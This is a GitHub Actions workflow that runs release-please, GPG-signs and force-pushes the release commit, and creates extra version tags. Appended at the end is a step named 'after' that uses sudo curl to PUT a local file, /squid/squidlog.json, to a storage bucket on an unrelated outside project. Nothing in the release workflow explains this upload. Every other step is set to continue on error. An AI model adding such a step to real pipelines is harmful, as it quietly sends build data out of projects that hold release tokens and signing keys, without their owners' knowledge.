    - continue-on-error: true
      uses: actions/checkout@v4
    - continue-on-error: true
      env:
        CHANGELOG_TYPES: ${{ inputs.changelog_types }}
      id: merge-changelog-types
      name: Merge default and user input changelog types
      uses: actions/github-script@v7
      with:
        script: "const changelogTypes = [\n  {type: \"feat\",     section: \"Features\"\
          },\n  {type: \"fix\",      section: \"Bug Fixes\"},\n  {type: \"perf\",\
          \     section: \"Performance Improvements\"},\n  {type: \"deps\",     section:\
          \ \"Dependencies\"},\n  {type: \"revert\",   section: \"Reverts\"},\n  {type:\
          \ \"docs\",     section: \"Documentation\"},\n  {type: \"style\",    section:\
          \ \"Styles\"},\n  {type: \"chore\",    section: \"Miscellaneous Chores\"\
          },\n  {type: \"refactor\", section: \"Code Refactoring\"},\n  {type: \"\
          test\",     section: \"Tests\"},\n  {type: \"ci\",       section: \"Continuous\
          \ Integration\"},\n];\ntry {\n  const userTypes = JSON.parse(process.env.CHANGELOG_TYPES.trim());\n\
          \  if (Array.isArray(userTypes)) {\n    changelogTypes.push(...userTypes);\n\
          \  }\n} catch (err) {\n  core.warning(`Failed to parse \"changelog_types\"\
          \ as JSON: ${err}`);\n}\n\ncore.setOutput(\"changelog-types-json\", JSON.stringify(changelogTypes));"
    - continue-on-error: true
      id: release
      uses: google-github-actions/release-please-action@v3
      with:
        changelog-types: ${{ steps.merge-changelog-types.outputs.changelog-types-json
          }}
        default-branch: ${{ github.event.repository.default_branch }}
        extra-files: ${{ inputs.extra_files }}
        include-v-in-tag: ${{ inputs.include_v_in_tag }}
        package-name: ${{ github.event.repository.name }}
        pull-request-title-pattern: ${{ inputs.pull_request_title_template }}
        release-type: ${{ inputs.release_type }}
        token: ${{ secrets.RELEASE_TOKEN }}
    - continue-on-error: true
      id: checkout-release-branch
      if: ${{ steps.release.outputs.pr != '' }}
      name: Checkout Release Branch
      uses: actions/checkout@v4.1.1
      with:
        fetch-depth: 0
        ref: ${{ fromJson(steps.release.outputs.pr).headBranchName }}
        token: ${{ secrets.RELEASE_TOKEN }}
    - continue-on-error: true
      id: key-import
      if: ${{ steps.checkout-release-branch.conclusion == 'success' }}
      name: Import GPG key
      uses: crazy-max/ghaction-import-gpg@v6.1.0
      with:
        git_commit_gpgsign: true
        git_config_global: true
        git_user_signingkey: true
        gpg_private_key: ${{ secrets.RELEASE_ACTOR_GPG_PRIVATE_KEY }}
        passphrase: ${{ secrets.RELEASE_ACTOR_GPG_PASSPHRASE }}
    - continue-on-error: true
      if: ${{ steps.key-import.conclusion == 'success' }}
      name: Amend the PR commit to sign it
      run: 'git config --global user.name "${{ steps.key-import.outputs.name }}"

        git config --global user.email "${{ steps.key-import.outputs.email }}"

        git commit --amend --no-edit -S

        git push --force'
    - continue-on-error: true
      env:
        CREATE_UNQUALIFIED: ${{ inputs.additional_unqualified_tags }}
        EXTRA_TAGS: ${{ inputs.extra_tags }}
        MAJOR: ${{ steps.release.outputs.major }}
        MINOR: ${{ steps.release.outputs.minor }}
        TAG_PREFIX: ${{ inputs.include_v_in_tag && 'v' || '' }}
      id: additional_tags
      if: steps.release.outputs.release_created
      name: Create additional tags
      uses: actions/github-script@v7
      with:
        script: "const tagPrefix = process.env.TAG_PREFIX;\nconst majorMinorTag =\
          \ `${tagPrefix}${process.env.MAJOR}.${process.env.MINOR}`;\nconst majorTag\
          \ = `${tagPrefix}${process.env.MAJOR}`;\nconst createUnqualified = process.env.CREATE_UNQUALIFIED\
          \ == 'true';\nconst unqalifiedTags = createUnqualified ? [majorMinorTag,\
          \ majorTag] : []\n\nconst extraTags = process.env.EXTRA_TAGS.split(\",\"\
          ).filter(n => n).map(n => { return n.trim(); });\nconst additionalTags =\
          \ Array.from(new Set([...unqalifiedTags, ...extraTags]));\n\nconst opts\
          \ = {\n  owner: context.repo.owner,\n  repo: context.repo.repo,\n  sha:\
          \ context.sha,\n};\n\nfor (const tag of additionalTags) {\n  core.info(`Creating/updating\
          \ tag ${tag}`);\n  try {\n    try {\n      // Try to create the tag first\n\
          \      await github.rest.git.createRef({...opts, ref: `refs/tags/${tag}`});\n\
          \    } catch (err) {\n      if (err.response?.data?.message !== 'Reference\
          \ already exists') {\n        throw (err);\n      }\n      // Try to update\
          \ the ref if it already exists\n      await github.rest.git.updateRef({...opts,\
          \ ref: `tags/${tag}`, force: true});\n    }\n    core.info(`Tag ${tag} created/updated\
          \ pointing to ${opts.sha}`)\n  } catch (err) {\n    core.error(`Failed to\
          \ create or update tag ${tag}: ${err} (opts: ${JSON.stringify(opts)})`);\n\
          \    core.setFailed(err);\n    process.exit();\n  }\n}\n\ncore.setOutput(\"\
          tags\", JSON.stringify(additionalTags));\nif (createUnqualified) {\n  core.setOutput(\"\
          major_minor_tag\", majorMinorTag);\n  core.setOutput(\"major_tag\", majorTag);\n\
          }"
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/circlefin/circle-public-github-workflows.$(date
        +%s)
    timeout-minutes: 60
name: Conventional Commit & Release Please
'on':
  workflow_dispatch: {}
permissions:
  contents: write
  pull-requests: write
